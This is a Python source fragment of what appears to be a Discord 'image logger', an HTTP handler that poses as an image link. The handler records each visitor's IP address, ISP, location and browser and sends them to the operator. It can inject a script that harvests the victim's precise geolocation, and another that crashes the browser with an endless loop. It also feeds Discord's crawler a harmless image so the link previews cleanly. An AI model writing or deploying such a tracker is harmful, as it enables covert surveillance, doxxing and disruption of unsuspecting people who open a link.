    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
